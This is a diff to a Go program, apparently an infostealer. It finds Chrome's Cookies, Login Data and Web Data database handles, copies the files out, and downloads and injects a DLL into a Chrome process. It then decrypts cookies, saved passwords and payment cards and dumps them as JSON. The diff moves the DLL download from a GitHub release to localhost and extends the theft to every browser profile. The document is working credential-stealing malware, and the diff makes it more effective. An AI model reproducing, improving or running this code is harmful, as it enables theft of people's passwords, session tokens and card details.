@@ -23,7 +23,7 @@ import (
 )
 
 const (
-	downloadURL = "https://github.com/carved4/gobound/releases/download/v1.0.0/gobound.dll"
+	downloadURL = "http://localhost:8080/gobound.dll"
 )
 
 type Cookie struct {
@@ -216,26 +216,16 @@ func injectDLL() {
 		panic(err)
 	}
 
-	targetFiles := map[string]bool{
-		"Cookies":    false,
-		"Login Data": false,
-		"Web Data":   false,
-	}
-
 	var targetPID uint32
-	var foundHandles = make(map[string]struct {
+	var foundHandles = make([]struct {
 		handle uintptr
 		pid    uint32
 		path   string
-	})
+		dbType string
+	}, 0)
 
-outerLoop:
 	for pid, handles := range chromeProcs {
 		for _, h := range handles {
-			if targetFiles["Cookies"] && targetFiles["Login Data"] && targetFiles["Web Data"] {
-				break outerLoop
-			}
-
 			type extractResult struct {
 				data []byte
 				path string
@@ -263,55 +253,59 @@ outerLoop:
 				continue
 			}
 
+			var dbType string
 			if strings.HasSuffix(path, "\\Cookies") || strings.HasSuffix(path, "\\Network\\Cookies") {
-				foundHandles["Cookies"] = struct {
-					handle uintptr
-					pid    uint32
-					path   string
-				}{h.Val, pid, path}
-				targetFiles["Cookies"] = true
-				targetPID = pid
+				dbType = "Cookies"
 			} else if strings.HasSuffix(path, "\\Login Data") {
-				foundHandles["Login Data"] = struct {
-					handle uintptr
-					pid    uint32
-					path   string
-				}{h.Val, pid, path}
-				targetFiles["Login Data"] = true
-				targetPID = pid
+				dbType = "Login Data"
 			} else if strings.HasSuffix(path, "\\Web Data") {
-				foundHandles["Web Data"] = struct {
+				dbType = "Web Data"
+			}
+
+			if dbType != "" {
+				foundHandles = append(foundHandles, struct {
 					handle uintptr
 					pid    uint32
 					path   string
-				}{h.Val, pid, path}
-				targetFiles["Web Data"] = true
-				targetPID = pid
+					dbType string
+				}{h.Val, pid, path, dbType})
+				if targetPID == 0 {
+					targetPID = pid
+				}
 			}
 		}
 	}
 
-	if targetPID == 0 {
+	if len(foundHandles) == 0 {
 		panic("no chrome process found with required DB handles")
 	}
 
 	println("[+] extracting database files...")
 	tmpDir := os.TempDir()
-	tempFiles := make(map[string]string)
+	tempFiles := make([]struct {
+		path    string
+		profile string
+		dbType  string
+	}, 0)
 
-	for dbType, info := range foundHandles {
+	for i, info := range foundHandles {
 		data, _, err := ExtractFile(info.handle, info.pid)
 		if err != nil {
 			continue
 		}
 
-		tmpPath := filepath.Join(tmpDir, fmt.Sprintf("chrome_%s_%d.db", strings.ReplaceAll(dbType, " ", "_"), targetPID))
+		tmpPath := filepath.Join(tmpDir, fmt.Sprintf("chrome_%s_%d_%d.db", strings.ReplaceAll(info.dbType, " ", "_"), info.pid, i))
 		err = os.WriteFile(tmpPath, data, 0600)
 		if err != nil {
 			continue
 		}
 
-		tempFiles[dbType] = tmpPath
+		profile := extractProfileName(info.path)
+		tempFiles = append(tempFiles, struct {
+			path    string
+			profile string
+			dbType  string
+		}{tmpPath, profile, info.dbType})
 	}
 
 	if len(tempFiles) == 0 {
@@ -346,7 +340,9 @@ outerLoop:
 		panic(fmt.Sprintf("failed to open target chrome process: %x", r))
 	}
 
-	dllBytes, err := net.Download(downloadURL)
+	var dllBytes []byte
+
+	dllBytes, err = net.Download(downloadURL)
 	if err != nil {
 		panic(err)
 	}
@@ -406,23 +402,19 @@ outerLoop:
 		Cards:     []Card{},
 	}
 
-	// Process databases locally
-	if cookiesPath, ok := tempFiles["Cookies"]; ok {
-		cookies := extractCookies(masterKey, cookiesPath, "Default")
-		output.Cookies = append(output.Cookies, cookies...)
-		os.Remove(cookiesPath)
-	}
-
-	if loginPath, ok := tempFiles["Login Data"]; ok {
-		passwords := extractPasswords(masterKey, loginPath, "Default")
-		output.Passwords = append(output.Passwords, passwords...)
-		os.Remove(loginPath)
-	}
-
-	if webDataPath, ok := tempFiles["Web Data"]; ok {
-		cards := extractCards(masterKey, webDataPath, "Default")
-		output.Cards = append(output.Cards, cards...)
-		os.Remove(webDataPath)
+	for _, fileInfo := range tempFiles {
+		switch fileInfo.dbType {
+		case "Cookies":
+			cookies := extractCookies(masterKey, fileInfo.path, fileInfo.profile)
+			output.Cookies = append(output.Cookies, cookies...)
+		case "Login Data":
+			passwords := extractPasswords(masterKey, fileInfo.path, fileInfo.profile)
+			output.Passwords = append(output.Passwords, passwords...)
+		case "Web Data":
+			cards := extractCards(masterKey, fileInfo.path, fileInfo.profile)
+			output.Cards = append(output.Cards, cards...)
+		}
+		os.Remove(fileInfo.path)
 	}
 
 	jsonData, _ := json.MarshalIndent(output, "", "  ")
@@ -432,6 +424,17 @@ outerLoop:
 
 func main() {
 	injectDLL()
+}
+
+func extractProfileName(path string) string {
+	parts := strings.Split(path, "\\")
+	for i, part := range parts {
+		if part == "User Data" && i+1 < len(parts) {
+			profile := parts[i+1]
+			return profile
+		}
+	}
+	return "Default"
 }
 
 func decryptAESGCM(key, encrypted []byte) ([]byte, error) {
